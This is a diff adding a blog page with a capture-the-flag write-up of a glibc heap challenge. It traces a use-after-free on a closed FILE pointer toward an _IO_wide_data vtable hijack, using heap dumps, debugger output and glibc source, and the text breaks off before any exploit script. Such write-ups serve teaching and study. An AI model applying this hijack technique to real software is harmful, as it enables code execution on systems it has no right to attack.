@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HTB University CTF 2026 - introductory FILE struct exploitation - lkt</title>
+    
+    
+    
+    <meta name="keywords" content="heap, file, techniques">
+    
+    
+    <link rel="canonical" href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;starshard-core&#x2F;" />
+    
+    <link rel="stylesheet" href="https://iokete.github.io/style.css">
+    
+  </head>
+  <body class="theme-tokyonight">
+    
+    <header>
+      <nav>
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;">/home/</a>
+
+        
+        
+        
+        <a href="https:&#x2F;&#x2F;iokete.github.io&#x2F;blog&#x2F;">&#x2F;blog&#x2F;</a>
+        
+
+        
+        
+      </nav>
+    </header>
+    <hr>
+    <main>
+      
+<section>
+  <h1>HTB University CTF 2026 - introductory FILE struct exploitation</h1>
+  
+  <p>published: <time>2025-12-22</time></p>
+  
+  
+  <p class="tags">
+  tags: [
+  
+  <a href="https://iokete.github.io/tags/heap/">#heap</a>, 
+  
+  <a href="https://iokete.github.io/tags/file/">#file</a>, 
+  
+  <a href="https://iokete.github.io/tags/techniques/">#techniques</a>
+  
+  ]
+  </p>
+  
+  <div>
+    <h2 id="tl-dr">TL;DR</h2>
+<p>UAF after <code>fopen()</code> leads to <code>_IO_wide_data</code> struct vtable hijack to call an arbitrary function</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>This challenge is part of <strong>HackTheBox University CTF 2025: Tinsel Trouble</strong></p>
+</blockquote>
+<p>Category: <strong>pwn</strong></p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="analyzing-the-source-code">Analyzing the source code</h3>
+<p>When we execute the program we are asked for a name and after sending an input we are welcomed with a menu:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="shellsession"><span class="giallo-l"><span>          ____</span></span>
+<span class="giallo-l"><span>       .-&quot; +&#39; &quot;-.</span></span>
+<span class="giallo-l"><span>      /.&#39;.&#39;A_&#39;*`.\</span></span>
+<span class="giallo-l"><span>     |:.*&#39;/\\-\.&#39;:|</span></span>
+<span class="giallo-l"><span>     |:.&#39;.||&quot;|.&#39;*:|</span></span>
+<span class="giallo-l"><span>      \:~^~^~^~^:/</span></span>
+<span class="giallo-l"><span>       /`-....-&#39;\</span></span>
+<span class="giallo-l"><span>      /          \</span></span>
+<span class="giallo-l"><span>      `-.,____,.-&#39;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>Tinselwick Tinkerer Name: aaa</span></span>
+<span class="giallo-l"><span>=== Welcome aaa — Starshard Console ===</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>[1] Arm Starshard Routine</span></span>
+<span class="giallo-l"><span>[2] Attach Wish-Script Fragment</span></span>
+<span class="giallo-l"><span>[3] Cancel Routine</span></span>
+<span class="giallo-l"><span>[4] Commit Routine</span></span>
+<span class="giallo-l"><span>[5] Quit</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">&gt;</span><span> </span></span></code></pre>
+<p>The binary has a function defined for each option, and works with an user-defined struct called <code>console_state</code>.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">typedef struct</span><span style="color: #9399B2;"> {</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">16</span><span style="color: #9399B2;">]</span><span>    tinkerer_name   </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">24</span><span style="color: #9399B2;">]</span><span>    spell_name  </span></span>
+<span class="giallo-l"><span>    FILE </span><span style="color: #94E2D5;">*</span><span>      core_log    </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    char</span><span style="color: #94E2D5;"> *</span><span>      spell_fragment  </span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    size_t</span><span>      fragment_sz</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span><span> console_state</span><span style="color: #9399B2;">;</span></span></code></pre>
+<ol>
+<li>
+<p><code>arm_routine</code>: uses <code>fopen</code> to open a file <code>starshard_core.txt</code>, saves it globally to <code>console_state.core_log</code>, then asks for a spell name, stores it in <code>console_state.spell_name</code> buffer and prints it to stdout.</p>
+</li>
+<li>
+<p><code>feed_fragment</code>: before doing anything, checks if global <code>console_state.core_log</code> is not <code>NULL</code>, then initializes the spell data by setting both <code>fragment_sz</code> and <code>spell_fragment</code> to 0. Then the program asks for <code>ulong fragment_sz</code> up to 0x1f4 bytes and allocates space in the heap for the spell using <code>malloc(fragment_sz)</code> stores the pointer in <code>spell_fragment</code> and takes input safely with <code>fgets()</code> into the pointer.</p>
+</li>
+<li>
+<p><code>cancel_routine</code>: simply does <code>fclose(console_state.core_log)</code> if <code>console_state.core_log != NULL</code>.</p>
+</li>
+<li>
+<p><code>commit_routine</code>: populates the file <code>console_state.core_log</code> with the data from <code>console_state.spell_fragment</code>.</p>
+</li>
+</ol>
+<h3 id="finding-the-vulnerability">Finding the vulnerability</h3>
+<p>As we can see there is no function that frees the chunk created by <code>feed_fragment</code>, so we can allocate an arbitrary number of &lt; 0x1f5 chunks.
+After some time playing with the binary I noticed that when using <code>fopen</code> on a file, a chunk of size 0x1e0 is created in the heap with the FILE struct of the new file.</p>
+<p>Heap layout after calling <code>arm_routine</code>:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"></span>
+<span class="giallo-l"><span>0x615b493e8290	0x0000000000000000	0x00000000000001e1	................</span></span>
+<span class="giallo-l"><span>0x615b493e82a0	0x00000000fbad3487	0x0000615b493e8323	.4......#.&gt;I[a..</span></span>
+<span class="giallo-l"><span>0x615b493e82b0	0x0000615b493e8323	0x0000615b493e8323	#.&gt;I[a..#.&gt;I[a..</span></span>
+<span class="giallo-l"><span>0x615b493e82c0	0x0000615b493e8323	0x0000615b493e8323	#.&gt;I[a..#.&gt;I[a..</span></span>
+<span class="giallo-l"><span>0x615b493e82d0	0x0000615b493e8323	0x0000615b493e8323	#.&gt;I[a..#.&gt;I[a..</span></span>
+<span class="giallo-l"><span>0x615b493e82e0	0x0000615b493e8324	0x0000000000000000	$.&gt;I[a..........</span></span>
+<span class="giallo-l"><span>0x615b493e82f0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8300	0x0000000000000000	0x00007cf0f1819680	.............|..</span></span>
+<span class="giallo-l"><span>0x615b493e8310	0x0000000000000003	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8320	0x0000000000000000	0x0000615b493e8380	..........&gt;I[a..</span></span>
+<span class="giallo-l"><span>0x615b493e8330	0xffffffffffffffff	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8340	0x0000615b493e8390	0x0000000000000000	..&gt;I[a..........</span></span>
+<span class="giallo-l"><span>0x615b493e8350	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8360	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8370	0x0000000000000000	0x00007cf0f181a560	........`....|..</span></span>
+<span class="giallo-l"><span>0x615b493e8380	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8390	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83a0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83b0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83c0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83d0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83e0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e83f0	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8400	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8410	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8420	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8430	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8440	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8450	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8460	0x0000000000000000	0x0000000000000000	................</span></span>
+<span class="giallo-l"><span>0x615b493e8470	0x00007cf0f181a020	0x0000000000020b91	 ....|..........	 &lt;-- Top chunk</span></span></code></pre>
+<p>We can confirm this with <code>dt</code> command in pwndbg:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"></span>
+<span class="giallo-l"><span>pwndbg</span><span style="color: #94E2D5;">&gt;</span><span> dt FILE </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e82a0</span></span>
+<span class="giallo-l"><span>FILE @ </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e82a0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82a0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0000</span><span> _flags               : </span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">452cb79</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82a8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0008</span><span> _IO_read_ptr         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82b0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0010</span><span> _IO_read_end         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82b8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0018</span><span> _IO_read_base        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82c0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0020</span><span> _IO_write_base       : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82c8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0028</span><span> _IO_write_ptr        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82d0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0030</span><span> _IO_write_end        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82d8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0038</span><span> _IO_buf_base         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8323</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82e0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0040</span><span> _IO_buf_end          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8324</span><span style="color: #A6E3A1;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82e8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0048</span><span> _IO_save_base        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82f0</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0050</span><span> _IO_backup_base      : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e82f8</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0058</span><span> _IO_save_end         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8300</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0060</span><span> _markers             : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8308</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0068</span><span> _chain               : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">7cf0f1819680</span><span style="color: #94E2D5;"> &lt;</span><span>_IO_2_1_stderr_</span><span style="color: #94E2D5;">&gt;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8310</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0070</span><span> _fileno              : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">3</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8314</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0074</span><span> _flags2              : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8318</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0078</span><span> _old_offset          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8320</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0080</span><span> _cur_column          : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8322</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0082</span><span> _vtable_offset       : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8323</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0083</span><span> _shortbuf            : </span><span style="color: #A6E3A1;">&quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8328</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0088</span><span> _lock                : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8380</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8330</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0090</span><span> _offset              : </span><span style="color: #94E2D5;">-</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">1</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8338</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0098</span><span> _codecvt             : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8340</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00a0</span><span> _wide_data           : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">615b493e8390</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8348</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00a8</span><span> _freeres_list        : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8350</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00b0</span><span> _freeres_buf         : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8358</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00b8</span><span> __pad5               : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8360</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00c0</span><span> _mode                : </span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">0</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    0x</span><span style="color: #FAB387;">0000615b493e8364</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">00c4</span><span> _unused2             : </span><span style="color: #A6E3A1;">&#39;</span><span style="color: #F5C2E7;">\000</span><span style="color: #A6E3A1;">&#39;</span><span style="color: #94E2D5;"> &lt;</span><span>repeats </span><span style="color: #FAB387;">19</span><span> times</span><span style="color: #94E2D5;">&gt;</span></span></code></pre>
+<p>To free it we just have to <code>fclose</code> the file by calling third option <code>cancel_routine</code>.</p>
+<p>But remember, we can create arbitrary chunks of size up to 0x1f4, and <code>cancel_routine</code> <strong>does not clear</strong> <code>console_state.core_log</code> leaving behind a dangling pointer. There is a use-after-free vulnerability that we can use to modify a FILE struct that we can <code>fclose</code> any time we want.</p>
+<p>In my experience, I have done close to nothing File Structure related in exploiting so I had to learn on the spot. Some time ago, I learnt about <strong>House of Orange</strong>, and <code>_IO_list_all</code> tampering. At that time I learnt the absolute basics of FSOP.</p>
+<p>The <code>_IO_FILE_plus</code> is a struct with variables: the file (with a structure like shown in the previous layout) and a struct <code>_IO_jump_t vtable</code>. The last one is a structure full of pointers that get called when doing specific actions with the FILE, we can take a look to the address <code>0x00007cf0f181a560</code> located in the heap layout.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="plain"><span class="giallo-l"><span>pwndbg&gt; tele 0x00007cf0f181a560</span></span>
+<span class="giallo-l"><span>00:0000│ rbp 0x7cf0f181a560 (__GI__IO_file_jumps) ◂— 0</span></span>
+<span class="giallo-l"><span>01:0008│+008 0x7cf0f181a568 (__GI__IO_file_jumps+8) ◂— 0</span></span>
+<span class="giallo-l"><span>02:0010│+010 0x7cf0f181a570 (__GI__IO_file_jumps+16) —▸ 0x7cf0f168ff70 (__GI__IO_file_finish) ◂— endbr64 </span></span>
+<span class="giallo-l"><span>03:0018│+018 0x7cf0f181a578 (__GI__IO_file_jumps+24) —▸ 0x7cf0f1690d40 (__GI__IO_file_overflow) ◂— endbr64 </span></span>
+<span class="giallo-l"><span>04:0020│+020 0x7cf0f181a580 (__GI__IO_file_jumps+32) —▸ 0x7cf0f1690a30 (__GI__IO_file_underflow) ◂— endbr64 </span></span>
+<span class="giallo-l"><span>05:0028│+028 0x7cf0f181a588 (__GI__IO_file_jumps+40) —▸ 0x7cf0f1691ce0 (_IO_default_uflow) ◂— endbr64 </span></span>
+<span class="giallo-l"><span>06:0030│+030 0x7cf0f181a590 (__GI__IO_file_jumps+48) —▸ 0x7cf0f1693200 (_IO_default_pbackfail) ◂— endbr64 </span></span>
+<span class="giallo-l"><span>07:0038│+038 0x7cf0f181a598 (__GI__IO_file_jumps+56) —▸ 0x7cf0f168f5a0 (__GI__IO_file_xsputn) ◂— endbr64 </span></span></code></pre>
+<p>For example, when a file is closed <code>__GI__IO_file_finish</code> is called.</p>
+<p>In older versions (&lt;=glibc-2.23) we could overwrite this <code>_IO_jump_t vtable</code> field with a custom vtable, located at an address we control but in glibc-2.24 a new check was added to the implementation preventing this kind of attack: <code>IO_validate_vtable</code>. This checks before executing that the vtable is located in a valid range of addresses, if it is not, aborts with <code>invalid stdio handle</code>.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">static inline const struct</span><span style="color: #F9E2AF;font-style: italic;"> _IO_jump_t</span><span style="color: #94E2D5;"> *</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">IO_validate_vtable</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">const struct</span><span style="color: #F9E2AF;font-style: italic;"> _IO_jump_t</span><span style="color: #94E2D5;"> *</span><span style="color: #EBA0AC;font-style: italic;">vtable</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">  /* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">     section.  */</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  uintptr_t</span><span> section_length </span><span style="color: #94E2D5;">=</span><span> __stop___libc_IO_vtables </span><span style="color: #94E2D5;">-</span><span> __start___libc_IO_vtables</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  uintptr_t</span><span> ptr </span><span style="color: #94E2D5;">=</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">uintptr_t</span><span style="color: #9399B2;">)</span><span> vtable</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  uintptr_t</span><span> offset </span><span style="color: #94E2D5;">=</span><span> ptr </span><span style="color: #94E2D5;">-</span><span style="color: #9399B2;"> (</span><span style="color: #CBA6F7;">uintptr_t</span><span style="color: #9399B2;">)</span><span> __start___libc_IO_vtables</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  if</span><span style="color: #9399B2;"> (</span><span style="color: #89B4FA;font-style: italic;">__glibc_unlikely</span><span style="color: #9399B2;"> (</span><span>offset </span><span style="color: #94E2D5;">&gt;=</span><span> section_length</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">    /* The vtable pointer is not in the expected section.  Use the</span></span>
+<span class="giallo-l"><span style="color: #9399B2;font-style: italic;">       slow path, which will terminate the process if necessary.  */</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">    _IO_vtable_check</span><span style="color: #9399B2;"> ();</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">  return</span><span> vtable</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>Nowadays the approach to this problem is using the <code>_IO_wide_data</code> struct, with a pointer located at offset 0xa0 in the FILE structure shown before.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span style="color: #CBA6F7;">struct</span><span> _IO_wide_data </span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_read_ptr</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_read_end</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_read_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_write_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_write_ptr</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_write_end</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_buf_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_buf_end</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_save_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_backup_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span style="color: #94E2D5;"> *</span><span>_IO_save_end</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    __mbstate_t</span><span> _IO_state</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    __mbstate_t</span><span> _IO_last_state</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    struct</span><span> _IO_codecvt _codecvt</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #F9E2AF;font-style: italic;">    wchar_t</span><span> _shortbuf</span><span style="color: #9399B2;">[</span><span style="color: #FAB387;">1</span><span style="color: #9399B2;">];</span></span>
+<span class="giallo-l"><span style="color: #CBA6F7;">    const struct</span><span style="color: #F9E2AF;font-style: italic;"> _IO_jump_t</span><span style="color: #94E2D5;"> *</span><span>_wide_vtable</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span style="color: #9399B2;">}</span></span></code></pre>
+<p>The structure is used to handle files with wide chars, and as we can see, it has some fields that are present too in the standard FILE struct, even our beloved <code>_IO_jump_t</code>. The main difference between this vtable and the one before, is that <code>_IO_jump_t *_wide_vtable</code> <strong>does not have validation checks</strong>.</p>
+<h3 id="exploiting-the-vulnerability">Exploiting the vulnerability</h3>
+<p>Now that we (kind of) know what path to take to solve the challenge, we need libc, heap and PIE leaks. This last one is needed because there is an additional function I did not mention before: <code>ginger_gate</code> that gives us a shell. The method we will use works perfectly with no PIE leaks to pop a <code>/bin/sh</code> shell too, but considering they gave us the win function we will use it.</p>
+<p>Remember that at the start we were asked for a name? This is the code that implements it:</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;"><code data-lang="c"><span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  printf</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;Tinselwick Tinkerer Name: &quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span style="color: #89B4FA;font-style: italic;">  fgets</span><span style="color: #9399B2;">(</span><span>console_state.tinkerer_name</span><span style="color: #9399B2;">,</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">10</span><span style="color: #9399B2;">,</span><span>stdin</span><span style="color: #9399B2;">);</span></span>
